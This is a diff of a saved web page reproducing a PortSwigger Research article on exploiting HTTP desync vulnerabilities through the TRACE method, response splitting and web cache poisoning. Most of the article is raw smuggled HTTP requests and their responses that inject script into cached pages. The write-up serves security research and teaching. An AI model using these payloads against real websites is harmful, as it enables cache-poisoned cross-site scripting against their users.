@@ -6,10 +6,16 @@
 <style>
   body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
   h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
   .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
-  p { margin-bottom: 0.72em; line-height: 1.58; }
   img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
   a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
   .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
   .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
   .article-elevator-btn:hover { background: rgba(10,14,39,1); }
@@ -28,7 +34,150 @@
     Source: PortSwigger Research | Date: 3/19/2024 2:00:00 PM | <a href="https://portswigger.net/research/trace-desync-attack" target="_blank" rel="noopener noreferrer">Lien</a> | Lang: EN
   </div>
   <div class="content">
-    <p>Have you ever found an HTTP desync vulnerability that seemed impossible to exploit due to its complicated constraints? In this blogpost we will explore a new exploitation technique that can be used to</p>
+    <div><div> <div> <p><img alt="Martin Doyhenard" src="https://portswigger.net/content/images/logos/portswigger-logo.jpg"></p>
+</div> <ul> <li> <p><span></span><strong>Published: </strong>19 March 2024 at 14:00 UTC</p> </li> <li> <p><strong>Updated: </strong>19 June 2024 at 13:58 UTC</p> </li> <li> </li> </ul> <p><img src="https://portswigger.net/cms/images/5e/4b/2606-article-article_img.png" alt="picture of a hidden bottle with poison to represent smuggled attack"><br></p><p>Have you ever found an HTTP desync vulnerability that seemed impossible to exploit due to its complicated constraints? In this blogpost we will explore a new exploitation technique that can be used to completely compromise a web application using TRACE - an ancient HTTP method that's more widely supported than you might think.&nbsp;</p><p>I recently came across an HTTP/2 Desync vulnerability (a.k.a <a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a>) in a Bug Bounty program that had some HTTP/2 header injection issues. Specifically, it was possible to inject a line break character in a header’s value, letting me smuggle transfer-encoding header which would eventually split the request at backend.
+</p><p>After confirming the vulnerability and submitting it to the program, I received the following message:</p><p>“
+<i>Thank you for your submission. Being able to smuggle a request is not a vulnerability in itself. How are you able to exploit the smuggling request?</i>
+.”
+</p><p>Although saying that smuggling a request is not a vulnerability by itself seems like a bold statement in 2024, I was confident enough I could craft a good Proof of Concept to demonstrate impact.
+</p><p>But after looking at the application for a few hours I started worrying, as there was no endpoint I could use to create my payload. There were no other vulnerabilities to leverage with request smuggling, nor reflected parameters that could be used with response smuggling, and even worse, the connections between the frontend and backend appeared to be isolated from each other so I couldn't directly attack other users. I was able to use a HEAD smuggled request to split messages in the response queue, but besides that, this host seemed to be unexploitable.
+</p><br><h2>The TRACE method</h2><p>At that moment I noticed something interesting. The backend server was configured to respond to TRACE requests.&nbsp;
+</p><p>For those unfamiliar with this method, the HTTP RFC states:
+</p><p>"<i>The TRACE method requests a remote, application-level loop-back of the request message. The final recipient of the request SHOULD reflect the message received…</i>”
+</p><p>This means that if we send a request like:
+</p><p><code>TRACE / HTTP/1.1
+Host: vulnerable.com
+SomeHeader: &lt;script&gt;alert(“reflected”)&lt;/script&gt; </code></p><p>We would obtain a response with the same request in the body, and with “message/http” as the content-type:
+</p><p><code>HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 125 <span>TRACE / HTTP/1.1
+Host: vulnerable.com
+SomeHeader: &lt;script&gt;alert(“reflected”)&lt;/script&gt;
+X-Forwarded-For: xxx.xxx.xxx.xxx
+</span></code></p><div><p>
+Even though you might think that the TRACE method is not really used in modern systems, some of the most popular web servers have this feature active by default and need to be disabled explicitly. Servers like Apache and many Microsoft IIS and Tomcat versions will respond to TRACE requests if no custom configuration is applied.</p></div><p>TRACE request can be really helpful when analysing a smuggling vulnerability. That’s because the response will show us exactly what is being received by the backend.
+</p><p>Being able to see the forwarded request can give information about headers that are modified or added (like the X-Forwarded-For header) by the proxy and even protocol modifications, such as downgrading from HTTP/2 to HTTP/1.1, which is the source of many desync vulnerabilities.
+</p><p>But what’s even more interesting is that we can use the TRACE response to build a payload to completely compromise the application, by combining it with Response Smuggling and <a href="https://portswigger.net/web-security/web-cache-poisoning">Web Cache Poisoning</a>. Let's see how:
+</p><br><h2>Response Smuggling Recap</h2><p>For those unfamiliar with Response Concatenation, the basic idea is to smuggle a HEAD request which will produce a response containing only headers. According to the HTTP RFC, this response can contain a content-length header which must have the same value that the GET response would have. This header should be ignored by a proxy when the response is matched to the HEAD request.
+</p><p>However, as the HEAD message was smuggled and the proxy never noticed this, the content-length will not be ignored, causing a concatenation with the next available response.
+</p><p>As an example, consider the following request which is used to exploit a server vulnerable to CL.0 desynchronization:
+</p><p><code>GET / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 108 <span>HEAD / HTTP/1.1
+Host: vulnerable.com
+</span>
+<span>GET /reflect?value=myReflectedString HTTP/1.1
+Host: vulnerable.com
+</span>
+</code></p><p>The first response will be forwarded to the attacker as usual.&nbsp;
+</p><p>But, as the proxy never saw a HEAD request, it will parse the content-length of the next response as it would normally do, using the next response as part of the body.
+</p><p><code><span>HTTP/1.1 200 OK
+Content-Type: text/html
+<span>Content-Length: 82
+</span></span>
+<span>HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 17 myReflectedString</span></code></p><p>Using this technique, an attacker can concatenate responses, using headers as body and modifying the behaviour of a message, by changing the content-type of a payload like in the previous example.
+</p><br><h2>Exploiting Desync with TRACE</h2><p>Going back to the HTTP/2 Desync vulnerability, I had no endpoint that reflected something useful in either the headers or the body of a response. But what about the TRACE request?
+</p><p>As TRACE responses will reflect any header that the backend receives, we can use it to generate a malicious script and place it in the body of the HEAD response:
+</p><p><code>GET / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 150 <span>HEAD / HTTP/1.1
+Host: vulnerable.com
+</span>
+<span>TRACE / HTTP/1.1
+Host: vulnerable.com
+SomeHeader: &lt;script&gt;alert(“reflected”)&lt;/script&gt;
+Other: aaaaaa…
+</span>
+</code></p><p>Resulting in the following responses:
+</p><p><code><span>HTTP/1.1 200 OK
+Content-Type: text/html
+<span>Content-Length: 165
+</span>
+HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 110 TRACE / HTTP/1.1
+Host: vulnerable.com
+SomeHeader: &lt;script&gt;alert(“reflected”)&lt;/script&gt;
+Othe</span>r: aaaaaa…. </code></p><p>The response will be forwarded to the next request that arrives through the same connection, taking control of the browser with a malicious JavaScript!
+</p><p>This technique, as powerful as it seems, requires the server to respond to TRACE requests, which might seem unlikely in most production environments.&nbsp;</p><p>As this method should only be used for debugging purposes, it's common for proxies to block these requests using some firewall rule which will return a Forbidden response.
+</p><p>But, as smuggling can be used to bypass firewall rules, it is possible to hide a TRACE message from the proxy and deliver it directly to the backend. So even if the method is forbidden, exploitation through desynchronization is still possible.
+</p><p>So far I was able to desynchronize the connections to reflect an arbitrary payload in a response. Yet, as the backend connections were isolated from each other, the malicious response will only be received by the user who issued it.
+</p><p>Even when connections are not shared between users, there are two techniques that can be used to exploit this condition: Web Cache Poisoning and Client-Side Desync.&nbsp;
+</p><p>In this case, Client-Side desync was out of the table (HTTP/2 injection was required), but the application was storing static responses in the cache, which meant that Web Cache Poisoning was possible.
+</p><p>Using Response Concatenation, it is possible to choose a response that contains a Content-Length and Cache-Control headers that forces the response to be stored in the cache.
+</p><p>Even though I was able to find many potential candidate endpoints, none of them had a Content-Type header with value text/html. This means that even if I was able to store my payload with one of these responses, the browser would not execute my malicious Javascript.
+</p><p>At that point I could have just sent the desync attack first, followed by a request to a static resource like “/payload.css” through the same HTTP/2 connection and store the response for that endpoint. Anyone requesting for “/payload.css” would receive the evil payload from the cache and the javascript would be executed.&nbsp;
+</p><p>Although this attack might have worked, to affect a user it was necessary to overwrite the cached response of an existing resource, and depending on how the page is loaded and the max-age of the response, it could be quite hard to effectively exploit a victim’s browser.
+</p><br><h2>From TRACE to Response Splitting</h2><p>Still, there was a better option. When I researched response smuggling I theorised a case in which the attacker could split a response in order to create an arbitrary message that would be stored in cache.&nbsp;
+</p><p>For this to be possible it is necessary that the application allows some content reflection which includes line breaks, so that the attacker can write response headers as well as the payload:
+</p><p><code>GET / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 360 HEAD /smuggled HTTP/1.1
+Host: vulnerable.com POST /reflect HTTP/1.1
+Host: vulnerable.com SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
+Content-Type: text/html\r\n
+Cache-Control: max-age=1000000\r\n
+Content-Length: 44\r\n
+\r\n
+&lt;script&gt;alert(“arbitrary response”)&lt;/script&gt;
+</code></p><p>Which would create the following responses:
+</p><p><code>HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 0 <span>HTTP/1.1 200 OK
+Content-Type: text/html
+<span>Content-Length: 165
+</span>
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 243 SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span>HTTP/1.1 200 Ok
+Content-Type: text/html
+Cache-Control: max-age=1000000
+Content-Length: 50 &lt;script&gt;alert(“arbitrary response”)&lt;/script&gt;
+</span></code></p><p>As previously explained, the last message will be used to complete the HEAD response, but in this case, only the first 78 bytes will be concatenated.&nbsp;
+</p><p>If the remaining bytes do not correspond to a valid HTTP message, the proxy would forward a 500 error message or just close the connection after forwarding the previous response.
+</p><p>But, in that case, the proxy is able to correctly parse the remaining payload as a valid HTTP response. For that reason, the message will be forwarded as the response of the next available request.&nbsp;
+</p><p>By this, the attacker was able to generate an arbitrary response including headers and body, that will be stored in the cache for the URL specified in a following request.
+</p><p>Finding an endpoint that allows us to reflect any byte sent in the body is extremely rare, but if TRACE requests are permitted, the attack is completely practical.
+</p><p>Note that, depending on the configuration, TRACE requests cannot contain a content-length header bigger than 0, and therefore is not possible to add the Javascript payload in the same request. We can add an extra response that generates the body of the payload using the same technique described above.&nbsp;
+</p><p>Some servers like Apache will allow a body If the “TraceEnabled extended” directive is present, which makes the attack even more simple.
+</p><p>If the body is not allowed, the message length header can be added using a smuggled transfer-encoding or with an extra response which will be appended right after the last header of the TRACE message:
+</p><p><code>GET / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 268 HEAD /smuggled HTTP/1.1
+Host: vulnerable.com TRACE / HTTP/1.1
+Host: vulnerable.com
+A: HTTP/1.1 200 Ok
+Cache-Control: max-age=1000000 HEAD /smuggled HTTP/1.1
+Host: vulnerable.com TRACE / HTTP/1.1
+Host: vulnerable.com
+A: &lt;script&gt;alert(“XSS”)&lt;/script&gt; </code></p><p>Which would generate the following responses
+</p><p><code>HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 0 <span>HTTP/1.1 200 Ok
+Content-Type: text/html
+<span>Content-Length: 165
+</span>
+HTTP/1.1 200 Ok
+Content-Type: message/http
+Content-Length: 150 TRACE / HTTP/1.1
+Host: vulnerable.com
+Padding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+A: </span><span><span>HTTP/1.1 200 OK
+Cache-Control: max-age=1000000
+B: HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 165
+</span>
+HTTP/1.1 200 Ok
+Content-Type: message/http
+Content-Length: 79 TRACE / HTTP/1.1
+Host: vulnerable.com
+A: <span>&lt;script&gt;alert(“Arbitrary XSS”)&lt;/script&gt;</span></span></code></p><p>If the TRACE implementation makes it impossible to append a message-length header in the response, it is also possible to create a redirect response that will be stored in the cache. This can either redirect to a stored payload (using the cache deception/poisoning technique), or to an attacker’s page to launch another attack like client-side desync or classic phishing.
+</p><br><h2>Conclusion</h2><p>In summary, this case shows how using forgotten methods like TRACE, combined with modern techniques such as HTTP Desync and Cache Poisoning, can lead to serious security issues in web applications. Even though TRACE is an old method, it proves to be very effective for attackers who know how to use it creatively.&nbsp;
+</p><p>This reminds us that we should never underestimate older technologies, as they can be used in new ways to create significant challenges for cybersecurity.<br></p> <p><a href="https://portswigger.net/research/articles">Back to all articles</a></p>
+</div></div>
   </div>
   <div class="article-elevator" aria-label="Navigation article">
     <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
@@ -37,12 +186,12 @@
   <script>
     function stripBlockingPanels() {
       const selector = '[id*="overlay"], [class*="overlay"], [id*="modal"], [class*="modal"], [id*="popup"], [class*="popup"], [id*="paywall"], [class*="paywall"], [id*="subscribe"], [class*="subscribe"], [id*="cookie"], [class*="cookie"], [id*="consent"], [class*="consent"], [id*="gdpr"], [class*="gdpr"], [role="dialog"], [aria-modal="true"]';
-      const textPattern = /\b(cookie|consent|gdpr|subscribe|subscription|paywall|abonnez[-\s]?vous|inscrivez[-\s]?vous|continue reading|continuez la lecture|connexion|login|register|inscription|abonnement|premium|subscriber|compte|account|se connecter|sign in|sign up)\b/i;
+      const textPattern = /\b(cookie|consent|gdpr|subscribe|subscription|paywall|abonnez[-\s]?vous|inscrivez[-\s]?vous|continue reading|continuez la lecture)\b/i;
       document.querySelectorAll(selector).forEach((node) => node.remove());
-      document.querySelectorAll('div, section, aside, header, footer, nav').forEach((node) => {
+      document.querySelectorAll('div, section, aside').forEach((node) => {
         const styleAttr = String(node.getAttribute('style') || '').toLowerCase();
         const classAndId = String(node.className || '').toLowerCase() + ' ' + String(node.id || '').toLowerCase();
-        const text = String(node.textContent || '').slice(0, 1200);
+        const text = String(node.textContent || '').slice(0, 800);
         const hasKeyword = textPattern.test(classAndId) || textPattern.test(text);
         const looksFixed = /(position\s*:\s*(fixed|sticky)|inset\s*:|top\s*:|left\s*:|right\s*:|bottom\s*:)/.test(styleAttr);
         const hasPriority = /(z-index\s*:\s*[1-9]\d{1,}|backdrop-filter|overflow\s*:\s*hidden)/.test(styleAttr);
